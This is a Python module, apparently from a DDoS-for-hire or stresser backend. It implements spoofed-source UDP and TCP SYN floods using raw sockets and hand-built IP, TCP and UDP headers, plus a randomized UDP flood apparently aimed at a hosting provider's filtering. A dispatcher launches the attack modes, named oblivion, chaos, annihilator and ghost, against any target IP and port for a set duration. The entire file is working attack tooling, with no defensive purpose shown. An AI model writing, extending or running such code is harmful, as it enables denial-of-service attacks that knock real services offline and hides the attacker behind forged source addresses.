import asyncio
import socket
import struct
import random
import time
import logging
from typing import List, Optional, Callable, Awaitable

from app.core.logger import logger

# ========== CONFIGURATION ==========
UDP_PAYLOAD_MIN = 1024
UDP_PAYLOAD_MAX = 65500
SYN_SOURCE_PORT_MIN = 1024
SYN_SOURCE_PORT_MAX = 65535
MAX_WORKERS_PER_ATTACK = 8

# ========== HELPER FUNCTIONS ==========

def _random_ip() -> str:
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def _random_bytes(size: int) -> bytes:
    return bytes(random.randint(0, 255) for _ in range(size))

def _build_ip_header(src_ip: str, dst_ip: str, protocol: int, payload_len: int) -> bytes:
    version_ihl = 0x45
    tos = 0
    total_len = 20 + payload_len
    id = random.randint(0, 65535)
    flags_offset = 0
    ttl = 64
    checksum = 0
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        version_ihl, tos, total_len, id, flags_offset, ttl, protocol, checksum,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
    )
    checksum = _checksum(ip_header)
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        version_ihl, tos, total_len, id, flags_offset, ttl, protocol, checksum,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
    )
    return ip_header

def _build_udp_header(src_port: int, dst_port: int, payload_len: int) -> bytes:
    udp_len = 8 + payload_len
    checksum = 0
    return struct.pack('!HHHH', src_port, dst_port, udp_len, checksum)

def _build_tcp_header(src_port: int, dst_port: int, seq: int, ack: int, flags: int) -> bytes:
    offset_res = (5 << 4)
    window = 65535
    checksum = 0
    urgent = 0
    return struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack, offset_res, flags, window, checksum, urgent)

def _checksum(data: bytes) -> int:
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def _create_raw_socket(protocol: int) -> Optional[socket.socket]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocol)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return sock
    except PermissionError:
        logger.warning("Raw socket creation failed (Permission denied). Spoofing disabled.")
        return None
    except Exception as e:
        logger.warning(f"Raw socket error: {e}")
        return None

# ========== CORE FLOOD FUNCTIONS ==========

async def _udp_flood(target_ip: str, target_port: int, duration: int, hold_time: int, spoof: bool = False, packet_size: int = 1400, workers: int = MAX_WORKERS_PER_ATTACK) -> int:
    end_time = time.time() + duration + hold_time
    total_packets = 0
    raw_sock = None
    if spoof:
        raw_sock = _create_raw_socket(socket.IPPROTO_UDP)

    if raw_sock:
        async def worker():
            nonlocal total_packets
            while time.time() < end_time:
                src_ip = _random_ip()
                src_port = random.randint(1024, 65535)
                payload = _random_bytes(random.randint(UDP_PAYLOAD_MIN, UDP_PAYLOAD_MAX))
                ip_header = _build_ip_header(src_ip, target_ip, socket.IPPROTO_UDP, len(payload))
                udp_header = _build_udp_header(src_port, target_port, len(payload))
                packet = ip_header + udp_header + payload
                try:
                    raw_sock.sendto(packet, (target_ip, target_port))
                    total_packets += 1
                except:
                    pass
                await asyncio.sleep(0)
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)

        async def worker():
            nonlocal total_packets
            while time.time() < end_time:
                # FIX: Random payload per packet (was static)
                payload = _random_bytes(packet_size)
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    total_packets += 1
                except BlockingIOError:
                    await asyncio.sleep(0.0001)
                await asyncio.sleep(0)

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks, return_exceptions=True)

    if raw_sock:
        raw_sock.close()
    else:
        sock.close()

    return total_packets


async def _tcp_syn_flood(target_ip: str, target_port: int, duration: int, hold_time: int, spoof: bool = False, workers: int = MAX_WORKERS_PER_ATTACK) -> int:
    end_time = time.time() + duration + hold_time
    total_packets = 0
    raw_sock = _create_raw_socket(socket.IPPROTO_TCP) if spoof else None
    if not raw_sock:
        logger.warning("TCP SYN flood requires raw socket (root). Skipping SYN flood.")
        return 0

    async def worker():
        nonlocal total_packets
        while time.time() < end_time:
            src_ip = _random_ip()
            src_port = random.randint(SYN_SOURCE_PORT_MIN, SYN_SOURCE_PORT_MAX)
            seq = random.randint(0, 0xFFFFFFFF)
            tcp_header = _build_tcp_header(src_port, target_port, seq, 0, 0x02)
            payload = b''
            ip_header = _build_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, len(tcp_header) + len(payload))
            packet = ip_header + tcp_header + payload
            try:
                raw_sock.sendto(packet, (target_ip, target_port))
                total_packets += 1
            except:
                pass
            await asyncio.sleep(0)

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks, return_exceptions=True)
    raw_sock.close()
    return total_packets


async def _udp_ovh_craft(target_ip: str, target_port: int, duration: int, hold_time: int, workers: int = MAX_WORKERS_PER_ATTACK) -> int:
    end_time = time.time() + duration + hold_time
    total_packets = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)

    async def worker():
        nonlocal total_packets
        while time.time() < end_time:
            # FIX: Random payload per packet
            size = random.randint(1200, 1400)
            patterns = [
                b'\x00' * size,
                b'\xff' * size,
                b'\xaa' * size,
                bytes(random.randint(0, 255) for _ in range(size)),
                b'\x00' * (size//2) + b'\x01' * (size//2),
            ]
            payload = random.choice(patterns)
            try:
                sock.sendto(payload, (target_ip, target_port))
                total_packets += 1
            except BlockingIOError:
                await asyncio.sleep(0.0001)
            await asyncio.sleep(0)

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks, return_exceptions=True)
    sock.close()
    return total_packets


async def _mixed_udp_tcp(target_ip: str, target_port: int, duration: int, hold_time: int, spoof: bool = False, workers: int = MAX_WORKERS_PER_ATTACK) -> int:
    udp_task = asyncio.create_task(_udp_flood(target_ip, target_port, duration, hold_time, spoof, workers=workers//2))
    tcp_task = asyncio.create_task(_tcp_syn_flood(target_ip, target_port, duration, hold_time, spoof, workers=workers//2))
    udp_count, tcp_count = await asyncio.gather(udp_task, tcp_task)
    return udp_count + tcp_count

# ========== LAYER 4 METHODS ==========

async def run_oblivion(attack_id, target, port, duration, hold_time, proxies=None, on_update=None):
    logger.info(f"[OBLIVION] Attack {attack_id} started: {target}:{port}")
    total = await _mixed_udp_tcp(target, port, duration, hold_time, spoof=True)
    if on_update:
        await on_update(attack_id, 0, total, 0)
    logger.info(f"[OBLIVION] Attack {attack_id} completed: {total} packets")

async def run_chaos(attack_id, target, port, duration, hold_time, proxies=None, on_update=None):
    logger.info(f"[CHAOS] Attack {attack_id} started: {target}:{port}")
    try:
        total = await _mixed_udp_tcp(target, port, duration, hold_time, spoof=True)
    except Exception:
        logger.warning("[CHAOS] Raw socket failed, using UDP-only flood")
        total = await _udp_flood(target, port, duration, hold_time, spoof=False)
    if on_update:
        await on_update(attack_id, 0, total, 0)
    logger.info(f"[CHAOS] Attack {attack_id} completed: {total} packets")

async def run_annihilator(attack_id, target, port, duration, hold_time, proxies=None, on_update=None):
    logger.info(f"[ANNIHILATOR] Attack {attack_id} started: {target}:{port}")
    tasks = [
        _udp_flood(target, port, duration, hold_time, spoof=True, workers=MAX_WORKERS_PER_ATTACK),
        _tcp_syn_flood(target, port, duration, hold_time, spoof=True, workers=MAX_WORKERS_PER_ATTACK),
        _udp_ovh_craft(target, port, duration, hold_time, workers=MAX_WORKERS_PER_ATTACK//2)
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    total = sum(r for r in results if isinstance(r, int))
    if on_update:
        await on_update(attack_id, 0, total, 0)
    logger.info(f"[ANNIHILATOR] Attack {attack_id} completed: {total} packets")

async def run_ghost(attack_id, target, port, duration, hold_time, proxies=None, on_update=None):
    logger.info(f"[GHOST] Attack {attack_id} started: {target}:{port}")
    total = await _udp_ovh_craft(target, port, duration, hold_time, workers=MAX_WORKERS_PER_ATTACK)
    if on_update:
        await on_update(attack_id, 0, total, 0)
    logger.info(f"[GHOST] Attack {attack_id} completed: {total} packets")

# ========== DISPATCHER ==========

async def run_layer4_attack(attack_id, target, port, method, duration, hold_time=0, proxies=None, on_update=None):
    method_map = {
        "oblivion": run_oblivion,
        "chaos": run_chaos,
        "annihilator": run_annihilator,
        "ghost": run_ghost,
    }
    engine = method_map.get(method.lower())
    if engine is None:
        logger.warning(f"Unknown layer4 method: {method}, using oblivion as fallback")
        engine = run_oblivion
    await engine(attack_id, target, port, duration, hold_time, proxies, on_update)
